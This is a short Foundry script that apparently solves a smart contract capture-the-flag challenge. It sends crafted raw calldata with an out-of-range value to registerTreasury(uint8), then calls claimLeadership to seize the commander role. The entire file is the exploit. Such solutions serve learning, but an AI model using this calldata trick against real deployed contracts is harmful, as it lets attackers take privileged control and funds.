// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface HigherOrder {
    function treasury() external view returns (address);
    function commander() external view returns (address);
    function claimLeadership() external;
}

contract HigherOrderSol is Script {
    HigherOrder public ho_ = HigherOrder(0xCF87FA7f2DF958fe4c0e75C535A676543d4e19E0);

    function run() external {
        vm.startBroadcast();

        address(ho_).call(abi.encodeWithSignature("registerTreasury(uint8)", 0x100));
        console.log("treasury:  ", ho_.treasury());
        ho_.claimLeadership();
        console.log("commander: ", ho_.commander());

        vm.stopBroadcast();
    }
}